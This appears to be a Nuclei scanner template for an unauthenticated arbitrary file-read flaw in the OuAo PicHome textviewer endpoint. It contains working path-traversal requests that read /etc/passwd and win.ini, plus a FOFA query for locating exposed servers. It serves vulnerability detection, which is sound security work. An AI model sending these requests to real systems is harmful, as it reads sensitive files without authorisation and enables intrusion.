http:
    - matchers:
        - part: body
          type: word
          words:
            - ; for 16-bit app support
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /index.php?mod=textviewer&op=index&src=C:/Windows/win.ini HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    - matchers:
        - part: body
          regex:
            - root:.*:0:0
          type: regex
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /index.php?mod=textviewer&op=index&src=/etc/passwd HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
id: ouaoPicHome-textviewer-File-reading
info:
    author: Superhero
    description: |-
        fofa: app="欧澳图文-欧澳PicHome"
        欧澳PicHome textviewer 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 欧澳PicHome textviewer 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/GVhlTjp9G7EZSxlYTFbN7w
    severity: high
    tags:
        - File reading
